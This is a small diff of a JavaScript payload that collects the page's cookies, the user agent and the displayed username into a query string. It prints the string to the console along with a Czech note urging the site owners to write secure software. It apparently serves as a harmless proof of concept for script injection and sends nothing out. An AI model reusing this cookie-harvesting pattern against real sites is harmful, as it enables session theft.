@@ -1,8 +1,7 @@
 var cookies = document.cookie;
 var userAgent = navigator.userAgent;
-var username = document.getElementsByTagName("strong")[0].textContent;
-username = username.replace(/\s+/g, '');
-var params = "?cookies=" + cookies + "&agent=" + userAgent + "&user=" + username;
+var user = document.getElementsByTagName("strong")[0].textContent.replace(/\s+/g, '');
+var params = "?cookies=" + cookies + "&agent=" + userAgent + "&user=" + user + "&test";
 console.log(params);
 console.log("DOBRÝ DEN, prosím vás naučte se vytvářet bezpečný software. děkuji. nebojte nic nezneužiji");
 
